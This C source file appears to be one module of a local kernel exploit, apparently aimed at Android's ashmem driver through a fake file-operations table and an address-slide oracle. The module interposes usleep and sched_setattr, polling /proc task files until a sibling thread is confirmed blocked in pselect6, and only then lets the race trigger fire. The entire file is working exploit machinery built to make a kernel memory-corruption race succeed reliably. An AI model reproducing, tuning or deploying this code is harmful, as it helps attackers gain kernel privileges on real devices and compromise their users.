#include "common.h"

#if defined(APP_CZG3_PSELECT_STATE_GATE) && APP_CZG3_PSELECT_STATE_GATE

/*
 * CZG3 currently uses the generic pselect route rather than the
 * APP_REQUIRE_FRESH_P0_SESSION route that owns the upstream in-line state
 * gate. Keep this experiment target-local and FOPS-only: interpose the
 * effective FOPS route delay and sched_setattr call without changing the P0
 * race, session model, offsets, or layout.
 *
 * The delay interposer first confirms that one sibling is actually blocked in
 * pselect6/do_select, then executes the already-selected FOPS delay unchanged
 * (60 ms by default, or an explicit supported override). The sched_setattr
 * interposer re-checks that exact TID immediately before allowing the real
 * trigger. Failure is fail-closed: sched_setattr is never called when either
 * state check fails.
 */

extern int __real_usleep(useconds_t usec);
extern long __real_sched_setattr_tid(int tid, int nice_value);

#define CZG3_GATE_MAX_SIBLINGS 32

struct czg3_pselect_gate_ctx {
  int active;
  int ready_ok;
  int target_tid;
  size_t ready_wait_usec;
  uint64_t ready_confirmed_ns;
  char ready_wchan[64];
};

static _Thread_local struct czg3_pselect_gate_ctx gate_ctx;
static atomic_int gate_banner_printed;

static uint64_t gate_now_ns(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    return 0;
  }
  return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static size_t gate_elapsed_usec(uint64_t started) {
  uint64_t now = gate_now_ns();
  if (!started || !now || now < started) {
    return 0;
  }
  return (size_t)((now - started) / 1000ULL);
}

static long gate_read_task_syscall_nr(int tid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  char buf[128];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  errno = saved_errno;
  if (n <= 0) {
    return -1;
  }
  buf[n] = 0;
  char *end = NULL;
  errno = 0;
  long nr = strtol(buf, &end, 0);
  if (errno || end == buf) {
    return -1;
  }
  return nr;
}

static int gate_read_task_wchan(int tid, char *buf, size_t size) {
  if (size < 2) {
    return 0;
  }
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, size - 1);
  int saved_errno = errno;
  close(fd);
  errno = saved_errno;
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  char *newline = strchr(buf, '\n');
  if (newline) {
    *newline = 0;
  }
  return 1;
}

static int gate_task_blocked_in_pselect(int tid, char *wchan, size_t size) {
  if (gate_read_task_syscall_nr(tid) != SYS_pselect6 ||
      !gate_read_task_wchan(tid, wchan, size)) {
    return 0;
  }
  return strncmp(wchan, "do_select", strlen("do_select")) == 0;
}

static int gate_collect_sibling_tids(int *tids, size_t capacity) {
  DIR *dir = opendir("/proc/self/task");
  if (!dir) {
    return -1;
  }

  int self_tid = (int)syscall(SYS_gettid);
  size_t count = 0;
  int overflow = 0;
  struct dirent *entry;
  while ((entry = readdir(dir)) != NULL) {
    char *end = NULL;
    errno = 0;
    long parsed = strtol(entry->d_name, &end, 10);
    if (errno || end == entry->d_name || *end || parsed <= 0 ||
        parsed > INT32_MAX || (int)parsed == self_tid) {
      continue;
    }
    if (count == capacity) {
      overflow = 1;
      break;
    }
    tids[count++] = (int)parsed;
  }
  closedir(dir);

  if (overflow) {
    return -1;
  }
  return (int)count;
}

static int gate_find_blocked_pselect_tid(const int *tids, size_t count,
                                         char *wchan, size_t wchan_size) {
  for (size_t index = 0; index < count; index++) {
    if (gate_task_blocked_in_pselect(tids[index], wchan, wchan_size)) {
      return tids[index];
    }
  }
  return -1;
}

static int gate_wait_for_any_pselect(size_t timeout_usec, int confirmations,
                                     int *tid_out, size_t *elapsed_usec,
                                     char *wchan, size_t wchan_size) {
  int tids[CZG3_GATE_MAX_SIBLINGS];
  int tid_count = gate_collect_sibling_tids(
      tids, sizeof(tids) / sizeof(tids[0]));
  uint64_t started = gate_now_ns();
  if (tid_count <= 0 || !started) {
    if (elapsed_usec) {
      *elapsed_usec = 0;
    }
    return 0;
  }

  uint64_t deadline = started + (uint64_t)timeout_usec * 1000ULL;
  int candidate = -1;
  int confirmed = 0;
  for (;;) {
    uint64_t now = gate_now_ns();
    if (!now || now >= deadline) {
      break;
    }

    char current_wchan[64] = "<not-read>";
    int tid = gate_find_blocked_pselect_tid(
        tids, (size_t)tid_count, current_wchan, sizeof(current_wchan));
    if (tid > 0 && tid == candidate) {
      confirmed++;
    } else if (tid > 0) {
      candidate = tid;
      confirmed = 1;
    } else {
      candidate = -1;
      confirmed = 0;
    }

    if (confirmed >= confirmations) {
      if (tid_out) {
        *tid_out = candidate;
      }
      if (wchan && wchan_size) {
        snprintf(wchan, wchan_size, "%s", current_wchan);
      }
      if (elapsed_usec) {
        *elapsed_usec = gate_elapsed_usec(started);
      }
      return 1;
    }

    if (tid > 0) {
      __real_usleep(100);
    } else {
      __asm__ volatile("yield" ::: "memory");
    }
  }

  if (elapsed_usec) {
    *elapsed_usec = gate_elapsed_usec(started);
  }
  return 0;
}

static int gate_wait_for_exact_pselect(int tid, size_t timeout_usec,
                                       int confirmations,
                                       size_t *elapsed_usec,
                                       char *wchan, size_t wchan_size) {
  uint64_t started = gate_now_ns();
  if (!started) {
    if (elapsed_usec) {
      *elapsed_usec = 0;
    }
    return 0;
  }

  uint64_t deadline = started + (uint64_t)timeout_usec * 1000ULL;
  int confirmed = 0;
  for (;;) {
    uint64_t now = gate_now_ns();
    if (!now || now >= deadline) {
      break;
    }

    char current_wchan[64] = "<not-read>";
    if (gate_task_blocked_in_pselect(tid, current_wchan,
                                     sizeof(current_wchan))) {
      confirmed++;
      if (wchan && wchan_size) {
        snprintf(wchan, wchan_size, "%s", current_wchan);
      }
      if (confirmed >= confirmations) {
        if (elapsed_usec) {
          *elapsed_usec = gate_elapsed_usec(started);
        }
        return 1;
      }
      __real_usleep(100);
    } else {
      confirmed = 0;
      __asm__ volatile("yield" ::: "memory");
    }
  }

  if (elapsed_usec) {
    *elapsed_usec = gate_elapsed_usec(started);
  }
  return 0;
}

static int gate_matches_fops_route(useconds_t usec) {
  if (slide_oracle_parent != fake_fops ||
      slide_oracle_target != data_addr(ASHMEM_MISC_FOPS)) {
    return 0;
  }

  /* Match the effective delay selected by app_trigger_fops_slide_slot(), not
   * only the target default. This keeps supported STACK_WRITER_DELAY_USEC
   * overrides behind the same state gate instead of creating a bypass. */
  const char *text = getenv("SLIDE_ENTER_DELAY_USEC");
  if (!text || !*text) {
    return 0;
  }
  char *end = NULL;
  errno = 0;
  unsigned long parsed = strtoul(text, &end, 0);
  return !errno && end != text && !*end && parsed == (unsigned long)usec;
}

int __wrap_usleep(useconds_t usec) {
  if (!gate_matches_fops_route(usec)) {
    return __real_usleep(usec);
  }

  memset(&gate_ctx, 0, sizeof(gate_ctx));
  gate_ctx.active = 1;
  gate_ctx.target_tid = -1;
  snprintf(gate_ctx.ready_wchan, sizeof(gate_ctx.ready_wchan),
           "<not-read>");
  gate_ctx.ready_ok = gate_wait_for_any_pselect(
      APP_CZG3_PSELECT_READY_TIMEOUT_USEC,
      APP_CZG3_PSELECT_WCHAN_CONFIRMATIONS,
      &gate_ctx.target_tid, &gate_ctx.ready_wait_usec,
      gate_ctx.ready_wchan, sizeof(gate_ctx.ready_wchan));
  if (gate_ctx.ready_ok) {
    gate_ctx.ready_confirmed_ns = gate_now_ns();
  }

  /* Preserve the already-selected FOPS delay even if readiness was not
   * confirmed. The following sched_setattr wrapper will refuse mutation. */
  return __real_usleep(usec);
}

long __wrap_sched_setattr_tid(int tid, int nice_value) {
  if (!gate_ctx.active) {
    return __real_sched_setattr_tid(tid, nice_value);
  }

  size_t guard_wait_usec = 0;
  char guard_wchan[64] = "<not-read>";
  int guard_ok = 0;
  if (gate_ctx.ready_ok && tid == gate_ctx.target_tid) {
    guard_ok = gate_wait_for_exact_pselect(
        tid, APP_CZG3_PSELECT_RECHECK_TIMEOUT_USEC,
        APP_CZG3_PSELECT_WCHAN_CONFIRMATIONS,
        &guard_wait_usec, guard_wchan, sizeof(guard_wchan));
  }

  uint64_t now_ns = gate_now_ns();
  uint64_t ready_to_trigger_usec =
      gate_ctx.ready_confirmed_ns && now_ns >= gate_ctx.ready_confirmed_ns
          ? (now_ns - gate_ctx.ready_confirmed_ns) / 1000ULL
          : UINT64_MAX;

  if (!gate_ctx.ready_ok || tid != gate_ctx.target_tid || !guard_ok) {
    pr_info("slide fops pselect state gate trigger=skipped ready=%d "
            "ready_usec=%zu ready_wchan=%s target_tid=%d call_tid=%d "
            "guard=%d guard_usec=%zu guard_wchan=%s "
            "ready_to_trigger_usec=%llu\n",
            gate_ctx.ready_ok, gate_ctx.ready_wait_usec,
            gate_ctx.ready_wchan, gate_ctx.target_tid, tid,
            guard_ok, guard_wait_usec, guard_wchan,
            (unsigned long long)ready_to_trigger_usec);
    memset(&gate_ctx, 0, sizeof(gate_ctx));
    errno = EAGAIN;
    return -1;
  }

  /* No successful-path logging here: printing before the real call returns to
   * slide_app.c would contaminate the existing action->readiness timing. */
  gate_ctx.active = 0;
  return __real_sched_setattr_tid(tid, nice_value);
}

__attribute__((constructor)) static void czg3_state_gate_banner(void) {
  if (atomic_exchange(&gate_banner_printed, 1) == 0) {
    pr_info("CZG3 FOPS pselect state gate enabled ready_timeout_us=%d "
            "recheck_timeout_us=%d confirmations=%d default_fops_delay_us=%d\n",
            APP_CZG3_PSELECT_READY_TIMEOUT_USEC,
            APP_CZG3_PSELECT_RECHECK_TIMEOUT_USEC,
            APP_CZG3_PSELECT_WCHAN_CONFIRMATIONS,
            APP_FOPS_ROUTE_COARSE_DELAY_USEC);
  }
}

#endif
